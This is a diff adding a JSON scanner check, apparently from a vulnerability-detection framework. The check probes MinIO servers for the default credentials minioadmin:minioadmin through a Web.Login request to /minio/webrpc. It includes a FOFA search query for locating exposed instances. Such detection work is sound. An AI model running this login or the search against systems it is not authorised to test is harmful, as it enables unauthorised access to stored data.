@@ -1,0 +1,85 @@
+{
+  "Name": "MinIO default account",
+  "Description": "MinIO has a default account, causing the service to be compromised.",
+  "Product": "MinIO",
+  "Homepage": "https://docs.min.io/",
+  "DisclosureDate": "2020-01-13",
+  "Author": "itardc@163.com",
+  "FofaQuery": "title=\"MinIO\" || app=\"MINIO-Browser\" || app=\"Minio\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://docs.min.io/"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"username\":\"minioadmin\",\"password\":\"minioadmin\"},\"method\":\"Web.Login\"}",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/json"
+        },
+        "method": "POST",
+        "uri": "/minio/webrpc"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "uiVersion",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "token",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "json",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": [
+        "keymemo|lastbody|variable|minioadmin:minioadmin",
+        "vulurl|lastbody|variable|{{{scheme}}}://minioadmin:minioadmin@{{{hostinfo}}}/minio/webrpc"
+      ]
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["defaultaccount"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["MinIO"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
